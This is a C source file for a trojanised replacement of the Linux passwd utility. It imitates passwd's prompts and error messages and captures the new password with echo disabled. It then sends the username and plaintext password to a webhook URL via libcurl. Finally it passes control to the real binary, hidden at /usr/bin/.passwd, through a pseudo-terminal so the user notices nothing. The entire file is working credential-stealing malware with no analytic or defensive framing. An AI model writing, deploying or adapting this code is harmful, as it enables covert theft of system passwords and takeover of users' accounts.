#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <libgen.h>
#include <curl/curl.h>
#include <termios.h>
#include <sys/wait.h>
#include <pwd.h> // For getpwnam()
#include <pty.h> // For forkpty

#define WEBHOOK_URL "YOUR_WEBHOOK_URL"

void send_webhook(const char *username, const char *operation, const char *password) {
    CURL *curl;
    CURLcode res;

    if (username == NULL || strlen(username) == 0) {
        username = "unknown_user";
    }
    if (operation == NULL || strlen(operation) == 0) {
        operation = "unknown_operation";
    }

    char payload[1024];
    snprintf(payload, sizeof(payload), "{\"content\": \"User: %s, Operation: %s, Password: %s\"}", 
             username, operation, password ? password : "null");

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, WEBHOOK_URL);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload);

        struct curl_slist *headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        res = curl_easy_perform(curl);
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    }
}

int user_exists(const char *username) {
    struct passwd *pw = getpwnam(username);
    return (pw != NULL);
}

void capture_password(char *password, size_t size, const char *prompt) {
    struct termios oldt, newt;

    tcgetattr(STDIN_FILENO, &oldt);
    newt = oldt;
    newt.c_lflag &= ~(ECHO);
    tcsetattr(STDIN_FILENO, TCSANOW, &newt);

    printf("%s", prompt);
    fflush(stdout);
    if (fgets(password, size, stdin) == NULL) {
        perror("Error reading password");
        password[0] = '\0';
    }

    size_t len = strlen(password);
    if (len > 0 && password[len - 1] == '\n') {
        password[len - 1] = '\0';
    }

    tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
    printf("\n");
}

int main(int argc, char *argv[]) {
    char *real_passwd_path = "/usr/bin/.passwd";
    char *operation = "change_password";
    char *username = NULL;
    char password[256] = {0};
    int intercept_password = 1;

    if (argc > 1) {
        for (int i = 1; i < argc; i++) {
            if (argv[i][0] != '-') {
                username = argv[i];
            } else if (strcmp(argv[i], "-l") == 0) {
                operation = "lock";
                intercept_password = 0;
            } else if (strcmp(argv[i], "-u") == 0) {
                operation = "unlock";
                intercept_password = 0;
            } else if (strcmp(argv[i], "-d") == 0) {
                operation = "delete";
                intercept_password = 0;
            } else if (strcmp(argv[i], "-e") == 0) {
                operation = "expire";
                intercept_password = 0;
            }
        }
    }

    if (argc == 1) {
        operation = "change_password";
        intercept_password = 1;
    }

    if (!username) {
        username = getlogin();
        if (!username) {
            perror("getlogin");
            exit(EXIT_FAILURE);
        }
    }

    if (!user_exists(username)) {
        fprintf(stderr, "passwd: user '%s' does not exist\n", username);
        exit(EXIT_FAILURE);
    }

    if (intercept_password) {
        capture_password(password, sizeof(password), "New password: ");
        char confirm_password[256] = {0};
        capture_password(confirm_password, sizeof(confirm_password), "Retype new password: ");

        if (strcmp(password, confirm_password) != 0) {
            fprintf(stderr, "Sorry, passwords do not match.\n");
            fprintf(stderr, "passwd: Authentication token manipulation error\n");
            fprintf(stderr, "passwd: password unchanged\n");
            exit(EXIT_FAILURE);
        }
    }

    send_webhook(username, operation, intercept_password ? password : NULL);

    if (strcmp(operation, "change_password") != 0) {     
        pid_t pid = fork();
        if (pid == 0) {
            execv(real_passwd_path, argv);
            perror("execv");
            exit(EXIT_FAILURE);
        } else if (pid > 0) {
            int status;
            waitpid(pid, &status, 0);
        } else {
            perror("fork");
            exit(EXIT_FAILURE);
        }
    } else {
        pid_t pid;
        int master_fd;
        if ((pid = forkpty(&master_fd, NULL, NULL, NULL)) == 0) {
            if (strcmp(operation, "change_password") == 0) {
                freopen("/dev/null", "w", stdout);
                freopen("/dev/null", "w", stderr);
            }
            execv(real_passwd_path, argv);
            perror("execv");
            exit(EXIT_FAILURE);
        } else if (pid > 0) {
            // Parent process: send the password to the child process
            if (intercept_password) {
                dprintf(master_fd, "%s\n%s\n", password, password);
            }
    
            int status;
            waitpid(pid, &status, 0);
            if (WIFEXITED(status) && WEXITSTATUS(status) != 0) {
                char error_text[256];
                strerror_r(WEXITSTATUS(status), error_text, sizeof(error_text));
                printf("%s\n", error_text);
            }
            close(master_fd);
        } else {
            perror("fork");
            exit(EXIT_FAILURE);
        }
    }

    return 0;
}
